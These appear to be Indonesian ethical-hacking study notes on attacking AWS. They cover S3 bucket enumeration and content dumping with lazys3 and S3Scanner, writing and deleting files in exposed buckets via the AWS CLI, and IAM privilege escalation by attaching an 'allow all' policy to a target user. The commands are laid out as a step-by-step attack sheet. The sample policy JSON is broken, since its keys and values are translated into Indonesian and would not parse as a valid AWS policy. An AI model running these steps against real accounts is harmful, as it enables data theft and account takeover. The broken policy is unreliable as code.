## Cloud Computing

> Cloud computing menghadirkan berbagai jenis layanan dan aplikasi melalui Internet. Layanan-layanan ini memungkinkan pengguna untuk menggunakan perangkat lunak dan perangkat keras yang dikelola oleh pihak ketiga di lokasi jarak jauh. Beberapa penyedia layanan cloud yang terkenal adalah Google, Amazon, dan Microsoft.

Gambaran Umum tentang Cloud Computing:

- Cloud computing mengacu pada penyediaan kapabilitas TI sesuai permintaan, di mana infrastruktur TI dan aplikasi disediakan kepada pelanggan sebagai layanan berpengukuran melalui jaringan. Layanan cloud diklasifikasikan menjadi tiga kategori, yaitu infrastructure-as-a-service (IaaS), platform-as-a-service (PaaS), dan software-as-a-service (SaaS), yang menawarkan teknik yang berbeda untuk pengembangan cloud.

Mencantumkan Bucket S3 menggunakan lazys3:

- lazys3 adalah alat skrip Ruby yang digunakan untuk memindai bucket AWS S3 dengan menggunakan permutasi yang berbeda. Alat ini memperoleh bucket S3 yang dapat diakses secara publik dan juga memungkinkan Anda untuk mencari bucket S3 dari perusahaan tertentu dengan memasukkan nama perusahaan.
- ` ruby lazys3.rb [Nama Perusahaan] `

Mencantumkan Bucket S3 menggunakan S3Scanner:

- S3Scanner adalah alat yang menemukan bucket S3 terbuka dan membuang kontennya. Alat ini mengambil daftar nama bucket untuk diperiksa sebagai masukan. Bucket S3 yang ditemukan akan ditampilkan dalam sebuah file. Alat ini juga membuang atau menampilkan konten dari bucket "terbuka" secara lokal.
- ` python3 ./s3scanner.py sites.txt `
- Buang semua bucket terbuka dan catat baik bucket terbuka maupun tertutup di found.txt:
  - ` python3 ./s3scanner.py --include-closed --out-file found.txt --dump names.txt `
- Hanya mencatat bucket terbuka dalam file keluaran default (buckets.txt):
  - ` python3 ./s3scanner.py names.txt `
- Simpan daftar file dari semua bucket terbuka ke dalam sebuah file:
  - ` python ./s3scanner.py --list names.txt `

Bucket S3 digunakan oleh pelanggan dan pengguna akhir untuk menyimpan dokumen teks, PDF, video, gambar, dll. Untuk menyimpan semua data ini, pengguna perlu membuat sebuah bucket dengan nama yang unik.

Berikut adalah beberapa teknik yang dapat diadopsi untuk mengidentifikasi Bucket AWS S3:

- Memeriksa HTML: Analisis kode sumber halaman web HTML di latar belakang untuk menemukan URL ke bucket S3 target
- Brute-Force URL: Gunakan Burp Suite untuk melakukan serangan brute-force pada URL bucket target untuk mengidentifikasi URL yang benar
- Menemukan subdomain: Gunakan alat seperti Findsubdomains dan Robtex untuk mengidentifikasi subdomain yang terkait dengan bucket target
- Pencarian IP Mundur: Gunakan mesin pencari seperti Bing untuk melakukan pencarian IP mundur untuk mengidentifikasi domain dari bucket S3 target
- Pencarian Google canggih: Gunakan operator pencarian Google canggih seperti "inurl" untuk mencari URL yang terkait dengan bucket S3 target

Memanfaatkan Bucket S3 Terbuka menggunakan AWS CLI:

- Antarmuka baris perintah AWS (CLI) adalah alat yang terpadu untuk mengelola layanan AWS. Dengan hanya satu alat yang perlu diunduh dan dikonfigurasi, Anda dapat mengendalikan beberapa layanan AWS dari baris perintah dan mengotomatiskannya melalui skrip.
- ` aws configure `
  - Ini akan meminta detail berikut:
    - AWS Access Key ID
    - AWS Secret Access Key
    - Nama wilayah default
    - Format keluaran default
- `aws s3 ls s3://[Nama Bucket]`
- ` aws s3 mv Hack.txt s3://certifiedhacker1 `
- `aws s3 rm s3://certifiedhacker1/Hack.txt`

Gambaran Umum tentang Eskalasi Hak Akses

- Hak akses adalah peran keamanan yang diberikan kepada pengguna untuk menggunakan program, fitur, sistem operasi, fungsi, file, kode, dll. untuk membatasi akses tergantung pada jenis pengguna. Eskalasi hak akses diperlukan ketika Anda ingin mengakses sumber daya sistem yang tidak diizinkan untuk diakses. Hal ini terjadi dalam dua bentuk: vertikal dan horizontal.
- Eskalasi Hak Akses Horizontal: Pengguna tidak sah mencoba mengakses sumber daya, fungsi, dan hak akses lain dari pengguna yang sah yang memiliki izin akses serupa
- Eskalasi Hak Akses Vertikal: Pengguna tidak sah mencoba mengakses sumber daya dan fungsi dari pengguna dengan hak akses yang lebih tinggi seperti administrator aplikasi atau situs

Meningkatkan Hak Akses Pengguna IAM dengan Memanfaatkan Kebijakan Pengguna yang Salah Konfigurasi:

- Kebijakan adalah entitas yang, ketika dilampirkan ke identitas atau sumber daya, menentukan izinnya. Anda dapat menggunakan AWS Management Console, AWS CLI, atau AWS API untuk membuat kebijakan yang dikelola pelanggan di IAM. Kebijakan yang dikelola pelanggan adalah kebijakan mandiri yang Anda kelola di akun AWS Anda. Anda kemudian dapat melampirkan kebijakan tersebut ke identitas (pengguna, grup, dan peran) di akun AWS Anda. Jika kebijakan pengguna tidak dikonfigurasi dengan benar, mereka dapat dimanfaatkan oleh penyerang untuk mendapatkan akses administrator penuh ke akun AWS pengguna target.

` aws iam create-policy --policy-name kebijakan-pengguna --policy-document file://kebijakan-pengguna.json `

- kebijakan-pengguna.json

```json
{

"Version":"2012-10-17",

"Pernyataan": [
{

    "Efek":"Memungkinkan",

    "Aksi":"*",

    "Sumber":"*"

}
]
}
```

- ` aws iam attach-user-policy --user-name [Nama Pengguna Target] --policy-arn arn:aws:iam::[ID Akun]:policy/kebijakan-pengguna `
- ` aws iam list-attached-user-policies --user-name [Nama Pengguna Target] `
- ` aws iam list-users `

- Daftar Bucket:

 S3: ` aws s3api list-buckets --query "Buckets[].Name" `

- Kebijakan Pengguna: ` aws iam list-user-policies `

- Kebijakan Peran: `aws iam list-role-policies`
- Kebijakan Grup: `aws iam list-group-policies`
- Buat pengguna: `aws iam create-user`
